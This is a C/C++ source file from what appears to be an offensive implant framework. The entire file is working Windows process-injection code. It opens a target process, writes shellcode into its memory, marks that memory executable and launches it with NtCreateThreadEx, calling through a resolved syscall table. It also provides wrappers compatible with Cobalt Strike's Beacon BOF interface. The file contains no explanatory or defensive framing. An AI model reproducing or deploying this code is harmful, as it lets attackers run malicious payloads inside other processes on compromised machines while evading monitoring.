/* Process Injection */

#include "../include/injection.h"
#include "../include/syscalls.h"
#include "../include/resolver.h"
#include "../include/utils.h"
#include "../include/managers.h"
#include "../libs/bastia/bastia.h"

/* ============================================================================
 * InjectIntoProcess
 *
 * Opens target process, allocates memory, writes shellcode, creates remote
 * thread via NtCreateThreadEx.
 * ============================================================================ */

BOOL InjectIntoProcess(functionTable* nt, DWORD pid,
                       const uint8_t* shellcode, SIZE_T shellcodeSize,
                       HANDLE* outProcess, HANDLE* outThread) {
    if (!nt || pid == 0 || !shellcode || shellcodeSize == 0) {
        return FALSE;
    }

    /* Step 1: Open target process */
    HANDLE hProcess = nullptr;
    OBJECT_ATTRIBUTES objAttrs = {};
    InitializeObjectAttributes(&objAttrs, nullptr, 0, nullptr, nullptr);

    CLIENT_ID clientId = {};
    clientId.UniqueProcess = (HANDLE)(UINT_PTR)pid;
    clientId.UniqueThread = nullptr;

    NTSTATUS status = nt->NtOpenProcess(
        &hProcess,
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION,
        &objAttrs, &clientId
    );

    if (!NT_SUCCESS(status)) {
        g_debugPrint("[INJECT] NtOpenProcess(%lu) failed: 0x%08X", pid, status);
        return FALSE;
    }

    g_debugPrint("[INJECT] Opened process %lu", pid);

    /* Step 2: Allocate memory in target */
    PVOID remoteAddr = nullptr;
    SIZE_T allocSize = shellcodeSize;

    status = nt->NtAllocateVirtualMemory(
        hProcess, &remoteAddr, 0, &allocSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
    );

    if (!NT_SUCCESS(status)) {
        g_debugPrint("[INJECT] NtAllocateVirtualMemory failed: 0x%08X", status);
        nt->NtClose(hProcess);
        return FALSE;
    }

    g_debugPrint("[INJECT] Allocated %zu bytes at %p", shellcodeSize, remoteAddr);

    /* Step 3: Write shellcode */
    NTSTATUS writeStatus = nt->NtWriteVirtualMemory(
        hProcess, remoteAddr, (PVOID)shellcode, shellcodeSize, nullptr);

    if (!NT_SUCCESS(writeStatus)) {
        g_debugPrint("[INJECT] Write shellcode failed: 0x%08X", writeStatus);
        nt->NtFreeVirtualMemory(hProcess, &remoteAddr, &allocSize, MEM_RELEASE);
        nt->NtClose(hProcess);
        return FALSE;
    }

    /* Step 4: Protect to PAGE_EXECUTE_READ */
    ULONG oldProtect = 0;
    nt->NtProtectVirtualMemory(hProcess, &remoteAddr, &allocSize, PAGE_EXECUTE_READ, &oldProtect);

    g_debugPrint("[INJECT] Shellcode written and protected");

    /* Step 5: Create remote thread via NtCreateThreadEx */
    HANDLE hThread = nullptr;
    status = nt->NtCreateThreadEx(
        &hThread, THREAD_ALL_ACCESS, nullptr,
        hProcess,
        remoteAddr,
        nullptr,
        THREAD_CREATE_FLAGS_NONE,
        0, 0, 0, nullptr
    );

    if (!NT_SUCCESS(status)) {
        g_debugPrint("[INJECT] Thread creation failed: 0x%08X", status);
        nt->NtFreeVirtualMemory(hProcess, &remoteAddr, &allocSize, MEM_RELEASE);
        nt->NtClose(hProcess);
        return FALSE;
    }

    g_debugPrint("[INJECT] Remote thread created");

    if (outProcess) *outProcess = hProcess;
    if (outThread) *outThread = hThread;

    return TRUE;
}

/* ============================================================================
 * BOF Compatibility: BeaconInjectProcess
 *
 * Signature matches Cobalt Strike's beacon.h
 * ============================================================================ */

void BeaconInjectProcess(HANDLE hProc, int pid, char* payload, int p_len,
                          int p_offset, char* arg, int a_len) {
    functionTable* nt = getFuncTableFromGlobal();
    if (!nt || !hProc || pid == 0 || !payload || p_len <= 0) {
        return;
    }

    if (p_offset < 0 || p_offset >= p_len) {
        g_debugPrint("[BOF] BeaconInjectProcess: invalid offset %d (len=%d)", p_offset, p_len);
        return;
    }

    g_debugPrint("[BOF] BeaconInjectProcess: pid=%d len=%d", pid, p_len);

    const uint8_t* shellcode = (const uint8_t*)payload + p_offset;
    SIZE_T shellcodeSize = p_len - p_offset;

    HANDLE hProcess = nullptr;
    HANDLE hThread = nullptr;

    if (InjectIntoProcess(nt, (DWORD)pid, shellcode, shellcodeSize, &hProcess, &hThread)) {
        g_debugPrint("[BOF] Injection into PID %d successful", pid);
        if (hThread) nt->NtClose(hThread);
        if (hProcess) nt->NtClose(hProcess);
    } else {
        g_debugPrint("[BOF] Injection into PID %d failed", pid);
    }
}

/* ============================================================================
 * BOF Compatibility: BeaconInjectTemporaryProcess
 *
 * Injects into a process created by BeaconSpawnTemporaryProcess.
 * ============================================================================ */

void BeaconInjectTemporaryProcess(PROCESS_INFORMATION* pInfo, char* payload,
                                   int p_len, int p_offset, char* arg, int a_len) {
    functionTable* nt = getFuncTableFromGlobal();
    if (!nt || !pInfo || !payload || p_len <= 0) {
        return;
    }

    if (p_offset < 0 || p_offset >= p_len) {
        g_debugPrint("[BOF] BeaconInjectTemporaryProcess: invalid offset %d (len=%d)", p_offset, p_len);
        return;
    }

    g_debugPrint("[BOF] BeaconInjectTemporaryProcess: pid=%lu len=%d",
                 (unsigned long)pInfo->dwProcessId, p_len);

    const uint8_t* shellcode = (const uint8_t*)payload + p_offset;
    SIZE_T shellcodeSize = p_len - p_offset;

    PVOID remoteAddr = nullptr;
    SIZE_T allocSize = shellcodeSize;

    NTSTATUS status = nt->NtAllocateVirtualMemory(
        pInfo->hProcess, &remoteAddr, 0, &allocSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
    );

    if (!NT_SUCCESS(status)) {
        g_debugPrint("[BOF] NtAllocateVirtualMemory failed: 0x%08X", status);
        return;
    }

    NTSTATUS writeStatus = nt->NtWriteVirtualMemory(
        pInfo->hProcess, remoteAddr, (PVOID)shellcode, shellcodeSize, nullptr);

    if (!NT_SUCCESS(writeStatus)) {
        g_debugPrint("[BOF] Write failed: 0x%08X", writeStatus);
        nt->NtFreeVirtualMemory(pInfo->hProcess, &remoteAddr, &allocSize, MEM_RELEASE);
        return;
    }

    ULONG oldProtect = 0;
    nt->NtProtectVirtualMemory(pInfo->hProcess, &remoteAddr, &allocSize, PAGE_EXECUTE_READ, &oldProtect);

    HANDLE hThread = nullptr;
    status = nt->NtCreateThreadEx(
        &hThread, THREAD_ALL_ACCESS, nullptr,
        pInfo->hProcess,
        remoteAddr,
        nullptr, THREAD_CREATE_FLAGS_NONE,
        0, 0, 0, nullptr
    );

    if (NT_SUCCESS(status)) {
        g_debugPrint("[BOF] Temporary process injection successful");
        nt->NtClose(hThread);
    } else {
        g_debugPrint("[BOF] Thread creation failed: 0x%08X", status);
        nt->NtFreeVirtualMemory(pInfo->hProcess, &remoteAddr, &allocSize, MEM_RELEASE);
    }
}

/* ============================================================================
 * Global functionTable accessor (for injection module)
 * ============================================================================ */

static functionTable* g_injectfuncTable = nullptr;

void SetInjectionfuncTable(functionTable* nt) {
    g_injectfuncTable = nt;
}

functionTable* getFuncTableFromGlobal() {
    return g_injectfuncTable;
}
